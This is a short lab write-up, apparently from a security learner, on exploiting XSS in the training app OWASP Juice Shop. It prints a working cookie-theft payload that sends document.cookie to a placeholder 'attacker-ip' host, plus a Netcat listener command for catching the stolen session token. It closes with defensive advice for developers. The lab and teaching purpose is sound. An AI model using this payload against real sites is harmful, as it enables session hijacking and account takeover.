Cross-Site Scripting (XSS) – Cookie Exposure Demonstration
Overview
Demonstrated the impact of Cross-Site Scripting (XSS) vulnerabilities in the OWASP Juice Shop application. The focus was on identifying injectable points and showcasing how malicious JavaScript can be executed in the context of a trusted domain.
Tools Used

Burp Suite (Proxy & Repeater)
OWASP Juice Shop
Firefox Browser
Kali Linux

Methodology & Steps

XSS Discovery
Identified a reflected XSS vulnerability in the search functionality by injecting basic test payloads.
Payload Development
Crafted a working XSS payload that could access browser data:HTML<img src=x onerror=alert(document.cookie)>
Cookie Exposure
Used a more advanced payload to exfiltrate session cookies to an attacker-controlled listener:HTML<img src=x onerror="new Image().src='http://attacker-ip:4444/steal?cookie='+document.cookie">
Verification
Set up a Netcat listener (nc -lvnp 4444) to capture transmitted cookies.
Successfully stole the victim's JWT session token.

Key Findings

Successfully executed both Reflected and Stored XSS payloads.
Demonstrated how XSS can lead to session cookie theft and potential account takeover.
Highlighted how lack of output encoding allows JavaScript execution in the victim's browser.

What I Learned

XSS occurs when user input is not properly sanitized or encoded before being rendered.
Reflected XSS executes immediately via crafted URLs, while Stored XSS persists and affects other users.
Stealing cookies via XSS can lead to full session hijacking.
The importance of Content Security Policy (CSP), input validation, and output encoding as primary defenses.

Security Takeaways for Developers

Always encode user-controlled data before displaying it (htmlspecialchars, CSP, etc.).
Implement strong Content Security Policy to restrict script execution.
Use HttpOnly and Secure flags on session cookies to reduce XSS impact.
Regularly test applications for XSS using both manual and automated methods.
